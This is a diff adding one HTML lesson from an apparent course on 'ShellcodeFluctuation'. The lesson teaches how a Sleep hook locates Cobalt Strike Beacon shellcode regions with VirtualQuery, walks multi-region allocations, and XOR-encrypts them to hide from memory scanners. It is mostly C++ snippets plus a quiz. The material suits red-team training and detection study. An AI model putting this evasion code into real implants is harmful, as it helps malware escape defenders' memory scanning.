@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: Shellcode Region Tracking - ShellcodeFluctuation Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4A0;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#10b981;--accent2:#059669;--gradient:linear-gradient(135deg,#10b981,#059669)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+<nav>
+  <div class="logo"><h2>ShellcodeFluctuation</h2><span>Memory Fluctuation Masterclass</span></div>
+  <a class="home-link" href="../ShellcodeFluctuation_index.html">&larr; Course Home</a>
+  <a class="mod-link" href="module1.html"><span>1. Memory Scanning Threat Model</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module2.html"><span>2. XOR Encryption for Memory</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module3.html"><span>3. VirtualProtect &amp; Pages</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module4.html"><span>4. Sleep Function Hooking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module5.html"><span>5. The Fluctuation Algorithm</span><span class="diff d2">d2</span></a>
+  <a class="mod-link active" href="module6.html"><span>6. Shellcode Region Tracking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module7.html"><span>7. Thread Stack Spoofing</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 6: Shellcode Region Tracking</h1>
+<p class="subtitle">Identifying shellcode allocation boundaries, using VirtualQuery for page-aligned operations, and supporting complex memory layouts.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Learn how ShellcodeFluctuation identifies the shellcode memory region boundaries when the <code>MySleep</code> hook fires, how <code>VirtualQuery</code> provides page-aligned region information, how to handle shellcode that spans multiple memory regions, and the challenges of tracking dynamically allocated sub-regions.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. The Region Discovery Problem</h2>
+
+<p>When the Beacon shellcode calls <code>Sleep</code> and control transfers to <code>MySleep</code>, the hook handler needs to know <strong>exactly which memory region to encrypt</strong>. This is not always straightforward because:</p>
+
+<div class="card">
+<h4>Region Discovery Challenges</h4>
+<ul>
+<li><strong>The loader knows the allocation</strong> &mdash; the initial <code>VirtualAlloc</code> returns the base address and size. This is the simplest case</li>
+<li><strong>Beacon may allocate additional memory</strong> &mdash; Cobalt Strike Beacon allocates heap memory for its own use, which also contains detectable artifacts</li>
+<li><strong>Reflective loading changes the layout</strong> &mdash; if the shellcode is a reflective DLL, it maps sections at different addresses</li>
+<li><strong>The hook runs in the shellcode's thread</strong> &mdash; we can use the thread's call stack or the return address to identify which region we are in</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. VirtualQuery: The Region Inspector</h2>
+
+<p><code>VirtualQuery</code> is the primary API for discovering memory region properties. Given any address within a region, it returns the region's base address, size, protection, and type:</p>
+
+<pre><code class="language-cpp">// VirtualQuery signature
+SIZE_T VirtualQuery(
+    LPCVOID                   lpAddress,  // Any address in the region
+    PMEMORY_BASIC_INFORMATION lpBuffer,   // Output structure
+    SIZE_T                    dwLength    // Size of output structure
+);
+
+// The MEMORY_BASIC_INFORMATION structure
+typedef struct _MEMORY_BASIC_INFORMATION {
+    PVOID  BaseAddress;       // Base of the page containing lpAddress
+    PVOID  AllocationBase;    // Base of the entire allocation
+    DWORD  AllocationProtect; // Initial protection at VirtualAlloc time
+    SIZE_T RegionSize;        // Size of contiguous pages with same attributes
+    DWORD  State;             // MEM_COMMIT, MEM_RESERVE, MEM_FREE
+    DWORD  Protect;           // Current protection
+    DWORD  Type;              // MEM_PRIVATE, MEM_MAPPED, MEM_IMAGE
+} MEMORY_BASIC_INFORMATION;</code></pre>
+
+<p>Two fields are especially important for shellcode tracking:</p>
+
+<table>
+<tr><th>Field</th><th>Meaning</th><th>Use in Fluctuation</th></tr>
+<tr><td><code>AllocationBase</code></td><td>The base address returned by the original <code>VirtualAlloc</code> call</td><td>Identifies the start of the entire shellcode allocation</td></tr>
+<tr><td><code>RegionSize</code></td><td>Size of contiguous pages with identical protection/state/type</td><td>Defines how much memory to encrypt (may be less than total allocation if protection varies)</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>3. Discovering Shellcode Boundaries at Hook Time</h2>
+
+<p>ShellcodeFluctuation can discover the shellcode region boundaries dynamically when the hook fires, using the return address on the stack:</p>
+
+<pre><code class="language-cpp">// Dynamic region discovery using _ReturnAddress()
+void WINAPI MySleep(DWORD dwMilliseconds) {
+    // The return address points into the shellcode that called Sleep
+    PVOID callerAddr = _ReturnAddress();
+
+    // Query the memory region containing the caller
+    MEMORY_BASIC_INFORMATION mbi;
+    VirtualQuery(callerAddr, &mbi, sizeof(mbi));
+
+    // mbi.AllocationBase = start of the shellcode allocation
+    // Now walk all committed regions in this allocation
+    LPVOID regionBase = mbi.AllocationBase;
+    SIZE_T totalSize = 0;
+
+    MEMORY_BASIC_INFORMATION walkMbi;
+    LPVOID walkAddr = regionBase;
+
+    while (VirtualQuery(walkAddr, &walkMbi, sizeof(walkMbi))) {
+        // Stop if we've left the allocation
+        if (walkMbi.AllocationBase != regionBase)
+            break;
+
+        // Only count committed regions
+        if (walkMbi.State == MEM_COMMIT) {
+            totalSize = (SIZE_T)((BYTE*)walkMbi.BaseAddress +
+                        walkMbi.RegionSize - (BYTE*)regionBase);
+        }
+
+        walkAddr = (BYTE*)walkMbi.BaseAddress + walkMbi.RegionSize;
+    }
+
+    // Now we know: regionBase and totalSize
+    // Proceed with fluctuation...
+}</code></pre>
+
+<div class="card green">
+<h4>Why Use _ReturnAddress()?</h4>
+<p><code>_ReturnAddress()</code> is an MSVC compiler intrinsic that returns the address of the instruction that will execute after the current function returns. When <code>MySleep</code> is called (via the hooked <code>Sleep</code>), the return address points into the Beacon shellcode. This gives us an address inside the shellcode allocation without needing to track it globally from the loader.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Page Alignment and VirtualProtect</h2>
+
+<p><code>VirtualProtect</code> operates on page boundaries. Understanding page alignment is critical for correct fluctuation:</p>
+
+<pre><code class="language-cpp">// x86-64 page size
+#define PAGE_SIZE 0x1000  // 4096 bytes
+
+// VirtualProtect rounds addresses DOWN to page boundary
+// and sizes UP to include all affected pages.
+
+// Example:
+// shellcodeBase = 0x1A0000 (page-aligned, from VirtualAlloc)
+// shellcodeSize = 0x4C800 (not page-aligned)
+
+// VirtualProtect(0x1A0000, 0x4C800, PAGE_READWRITE, &old)
+// Actually affects pages: 0x1A0000 through 0x1EC000
+// That's ceil(0x4C800 / 0x1000) = 77 pages
+
+// VirtualAlloc always returns page-aligned addresses:
+LPVOID base = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
+                           PAGE_READWRITE);
+// base is guaranteed to be 0x????0000 (64K aligned on Windows)</code></pre>
+
+<div class="card">
+<h4>Page Alignment Guarantees</h4>
+<table>
+<tr><th>API</th><th>Base Address Alignment</th><th>Size Alignment</th></tr>
+<tr><td><code>VirtualAlloc</code></td><td>64 KB (allocation granularity)</td><td>Rounded up to page size (4 KB)</td></tr>
+<tr><td><code>VirtualProtect</code></td><td>Rounds down to page boundary</td><td>Rounds up to include full pages</td></tr>
+<tr><td><code>VirtualQuery</code></td><td>Reports page-aligned regions</td><td>Reports page-aligned sizes</td></tr>
+</table>
+<p>Since <code>VirtualAlloc</code> returns 64K-aligned addresses and <code>VirtualProtect</code> rounds to page boundaries, the fluctuation operates cleanly on aligned memory regions. There is no risk of accidentally affecting memory outside the shellcode allocation.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Multi-Region Shellcode</h2>
+
+<p>Complex implants may not have a single contiguous memory region. A reflective DLL loader, for example, maps different PE sections with different protections:</p>
+
+<pre><code class="language-cpp">// Reflective DLL memory layout example:
+// AllocationBase = 0x1A0000
+//
+// Region 1: 0x1A0000 - 0x1A0FFF  PE headers  (PAGE_READONLY)
+// Region 2: 0x1A1000 - 0x1A5FFF  .text       (PAGE_EXECUTE_READ)
+// Region 3: 0x1A6000 - 0x1A7FFF  .rdata      (PAGE_READONLY)
+// Region 4: 0x1A8000 - 0x1A9FFF  .data       (PAGE_READWRITE)
+// Region 5: 0x1AA000 - 0x1AAFFF  .reloc      (PAGE_READONLY)
+
+// Each region has different protection. We need to:
+// 1. Save each region's current protection
+// 2. Flip ALL to RW
+// 3. Encrypt ALL
+// 4. After sleep: Decrypt ALL
+// 5. Restore EACH region's original protection</code></pre>
+
+<p>To handle this, the fluctuation code must walk the entire allocation and process each region individually:</p>
+
+<pre><code class="language-cpp">struct RegionInfo {
+    LPVOID  base;
+    SIZE_T  size;
+    DWORD   originalProtect;
+};
+
+// Walk the allocation and collect all committed regions
+std::vector&lt;RegionInfo&gt; CollectRegions(LPVOID allocationBase) {
+    std::vector&lt;RegionInfo&gt; regions;
+    MEMORY_BASIC_INFORMATION mbi;
+    LPVOID addr = allocationBase;
+
+    while (VirtualQuery(addr, &mbi, sizeof(mbi))) {
+        if (mbi.AllocationBase != allocationBase)
+            break;
+
+        if (mbi.State == MEM_COMMIT) {
+            regions.push_back({
+                mbi.BaseAddress,
+                mbi.RegionSize,
+                mbi.Protect
+            });
+        }
+
+        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
+    }
+
+    return regions;
+}
+
+// Encrypt all regions
+void EncryptAllRegions(std::vector&lt;RegionInfo&gt;& regions, DWORD key) {
+    for (auto& r : regions) {
+        DWORD oldProt;
+        VirtualProtect(r.base, r.size, PAGE_READWRITE, &oldProt);
+        r.originalProtect = oldProt;  // Save actual protection
+        xor32((BYTE*)r.base, r.size, key);
+    }
+}
+
+// Decrypt and restore all regions
+void DecryptAllRegions(std::vector&lt;RegionInfo&gt;& regions, DWORD key) {
+    for (auto& r : regions) {
+        xor32((BYTE*)r.base, r.size, key);
+        DWORD dummy;
+        VirtualProtect(r.base, r.size, r.originalProtect, &dummy);
+    }
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>6. Handling the Beacon Heap</h2>
+
+<p>Cobalt Strike Beacon allocates heap memory for its configuration, task buffers, and downloaded data. This heap data can contain IOCs (C2 URLs, decrypted task output, etc.) that scanners can find. ShellcodeFluctuation's approach to the heap varies:</p>
+
+<table>
+<tr><th>Approach</th><th>What Gets Encrypted</th><th>Heap Coverage</th><th>Complexity</th></tr>
+<tr><td><strong>Single allocation only</strong></td><td>The original <code>VirtualAlloc</code> region containing the shellcode</td><td>None &mdash; heap is unprotected</td><td>Simple</td></tr>
+<tr><td><strong>All private executable</strong></td><td>All <code>MEM_PRIVATE</code> regions with execute permissions</td><td>Partial &mdash; misses RW heap data</td><td>Moderate</td></tr>
+<tr><td><strong>Full allocation walk</strong></td><td>All committed regions under the same AllocationBase</td><td>Good &mdash; covers co-allocated regions</td><td>Moderate</td></tr>
+<tr><td><strong>Heap tracking</strong></td><td>Hook HeapAlloc/VirtualAlloc to track all implant allocations</td><td>Full &mdash; covers all implant memory</td><td>High</td></tr>
+</table>
+
+<div class="card warn">
+<h4>Practical Limitation</h4>
+<p>ShellcodeFluctuation's primary focus is the shellcode execution region (the code itself). Beacon's heap allocations for configuration and data buffers are separate and may not be covered by the basic fluctuation mechanism. More advanced solutions like Cobalt Strike's built-in Sleep Mask Kit provide broader coverage of Beacon-owned memory.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Thread Safety Considerations</h2>
+
+<p>If the implant uses multiple threads, the fluctuation mechanism must handle concurrency:</p>
+
+<pre><code class="language-cpp">// Potential race condition:
+//
+// Thread 1 (Beacon): Calls Sleep -> MySleep encrypts shellcode
+// Thread 2 (Worker): Still executing shellcode code
+//
+// If Thread 2 is running when Thread 1 encrypts, Thread 2
+// will execute encrypted garbage and crash!
+
+// ShellcodeFluctuation assumes single-threaded shellcode:
+// Cobalt Strike Beacon calls Sleep from its main loop,
+// and worker tasks complete before the sleep cycle.
+
+// For multi-threaded implants, a more robust approach:
+CRITICAL_SECTION g_fluctLock;
+volatile LONG    g_activeThreads = 0;
+
+void WINAPI MySleep_ThreadSafe(DWORD dwMilliseconds) {
+    EnterCriticalSection(&g_fluctLock);
+
+    // Wait for all other threads to reach a safe point
+    while (InterlockedCompareExchange(&g_activeThreads, 0, 0) > 1) {
+        LeaveCriticalSection(&g_fluctLock);
+        SwitchToThread();
+        EnterCriticalSection(&g_fluctLock);
+    }
+
+    // Safe to encrypt - only this thread is active in shellcode
+    // ... perform fluctuation cycle ...
+
+    LeaveCriticalSection(&g_fluctLock);
+}</code></pre>
+
+<div class="card">
+<h4>Single-Thread Assumption</h4>
+<p>In practice, ShellcodeFluctuation operates under the assumption that the Beacon is single-threaded at the point it calls <code>Sleep</code>. Cobalt Strike Beacon dispatches jobs synchronously in its main loop and only calls <code>Sleep</code> when all pending tasks are complete. This makes the single-thread assumption safe for the primary use case.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Region Tracking Summary</h2>
+
+<p>The complete region tracking approach used by ShellcodeFluctuation combines static initialization with dynamic verification:</p>
+
+<pre><code class="language-cpp">// Complete region tracking flow in MySleep:
+void WINAPI MySleep(DWORD dwMilliseconds) {
+    // Option A: Use pre-configured global state
+    // (Set during initialization by the loader)
+    LPVOID base = g_state.shellcodeBase;
+    SIZE_T size = g_state.shellcodeSize;
+
+    // Option B: Dynamic discovery (more robust)
+    // Uses _ReturnAddress() to find caller's allocation
+    MEMORY_BASIC_INFORMATION mbi;
+    VirtualQuery(_ReturnAddress(), &mbi, sizeof(mbi));
+    base = mbi.AllocationBase;
+    // Walk to find total committed size...
+
+    // Validate: is this the expected region?
+    if (base != g_state.shellcodeBase) {
+        // Unexpected caller - could be a different thread
+        // or the shellcode relocated. Use global state as fallback.
+        base = g_state.shellcodeBase;
+        size = g_state.shellcodeSize;
+    }
+
+    // Proceed with fluctuation using (base, size)
+    FluctuateCycle(base, size, dwMilliseconds);
+}</code></pre>
+
+<div class="card green">
+<h4>Key Takeaways</h4>
+<ul>
+<li><strong>VirtualQuery</strong> provides page-aligned region information for any address</li>
+<li><strong>AllocationBase</strong> identifies the original allocation, enabling full-allocation walks</li>
+<li><strong>Page alignment is guaranteed</strong> by the Windows Memory Manager for <code>VirtualAlloc</code> regions</li>
+<li><strong>Multi-region support</strong> requires saving per-region original protections and restoring them individually</li>
+<li><strong>Thread safety</strong> is assumed via single-thread behavior of the Beacon sleep loop</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="C">
+<p>Q1: What does VirtualQuery's AllocationBase field represent?</p>
+<div class="quiz-btn" data-choice="A">A) The page-aligned base of the queried address</div>
+<div class="quiz-btn" data-choice="B">B) The base address of the process heap</div>
+<div class="quiz-btn" data-choice="C">C) The base address returned by the original VirtualAlloc call that created the allocation</div>
+<div class="quiz-btn" data-choice="D">D) The lowest address in the process address space</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q2: Why might a reflective DLL's memory layout require per-region protection tracking?</p>
+<div class="quiz-btn" data-choice="A">A) Reflective DLLs use PAGE_GUARD on all pages</div>
+<div class="quiz-btn" data-choice="B">B) Different PE sections (.text, .rdata, .data) have different original protections that must be individually restored</div>
+<div class="quiz-btn" data-choice="C">C) Reflective DLLs cannot be encrypted with XOR</div>
+<div class="quiz-btn" data-choice="D">D) Each section uses a different XOR key</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q3: How does ShellcodeFluctuation identify the shellcode region when the Sleep hook fires?</p>
+<div class="quiz-btn" data-choice="A">A) Uses pre-configured global state (base + size) set during initialization, optionally verified with _ReturnAddress() and VirtualQuery</div>
+<div class="quiz-btn" data-choice="B">B) Scans all process memory for executable private regions</div>
+<div class="quiz-btn" data-choice="C">C) Reads the shellcode path from a configuration file</div>
+<div class="quiz-btn" data-choice="D">D) Uses a hardware breakpoint to detect the shellcode region</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module5.html">&larr; Prev: The Fluctuation Algorithm</a>
+<a class="primary" href="module7.html">Next: Thread Stack Spoofing Integration &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
